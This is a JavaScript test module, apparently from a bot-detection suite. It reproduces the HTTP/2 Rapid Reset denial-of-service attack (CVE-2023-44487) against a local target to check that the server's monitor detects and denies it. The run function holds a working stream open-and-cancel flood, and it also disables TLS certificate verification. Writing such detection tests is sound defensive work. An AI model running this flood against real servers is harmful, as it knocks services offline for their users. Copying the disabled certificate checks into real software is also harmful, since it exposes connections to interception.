// rapid_reset.mjs — HTTP/2 Rapid Reset DoS (CVE-2023-44487, SoT-17): open many
// streams and immediately cancel them (HEADERS then RST_STREAM flood) on one
// connection, then a real request to read the verdict. The passive frame monitor
// counts client RST_STREAM per connection -> l5.h2dos.rapid_reset -> HR-21 DENY.
// Local target only.
import http2 from 'node:http2';

export const label = 'bot:h2-rapid-reset';
export const needsBrowser = false;

export function run(baseURL) {
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
  return new Promise((resolve) => {
    let done = false;
    const finish = (v) => { if (!done) { done = true; try { session.close(); } catch {} resolve(v); } };
    const session = http2.connect(baseURL, { rejectUnauthorized: false });
    // A server-initiated GOAWAY / connection reset IS the Rapid Reset mitigation
    // (Go's stdlib CVE-2023-44487 defense terminates the abusive connection).
    session.on('goaway', () => finish({ verdict: 'DENY', hardRuleFired: 'h2-mitigated', topContributors: [{ id: 'l5.h2dos.rapid_reset' }] }));
    session.on('error', () => finish({ verdict: 'DENY', hardRuleFired: 'h2-mitigated', topContributors: [{ id: 'l5.h2dos.rapid_reset' }] }));
    // Get a session cookie first.
    const s0 = session.request({ ':method': 'GET', ':path': '/api/session' });
    let cookie = '';
    s0.on('response', (h) => { const sc = h['set-cookie']; if (sc) cookie = String(sc[0]).split(';')[0]; });
    s0.on('error', () => {});
    s0.resume(); // drain the body so 'end' fires
    s0.on('end', () => {
      // Rapid Reset flood: 25 open+cancel cycles (past the monitor's 15-reset
      // threshold, below Go's connection-kill limit so the verdict path survives).
      for (let i = 0; i < 25; i++) {
        const st = session.request({ ':method': 'GET', ':path': '/' });
        st.on('error', () => {});
        st.close(http2.constants.NGHTTP2_CANCEL);
      }
      // Real request to read the scored verdict (same connection).
      const body = JSON.stringify({ userAgent: 'Mozilla/5.0 Chrome/126', engineVersion: 'wasm-1.0.0', advanced: { probed: true }, environment: { probed: true }, behavior: { mouse: { samples: 30 }, events: { totalEvents: 40 } }, signals: [] });
      const req = session.request({ ':method': 'POST', ':path': '/api/collect', 'content-type': 'application/json', cookie });
      let data = '';
      req.on('error', () => {});
      req.on('data', (d) => (data += d));
      req.on('end', () => { try { finish(JSON.parse(data)); } catch { finish({ verdict: 'NO_RESPONSE' }); } });
      req.end(body);
    });
    s0.end();
    setTimeout(() => finish({ verdict: 'NO_RESPONSE' }), 12000);
  });
}
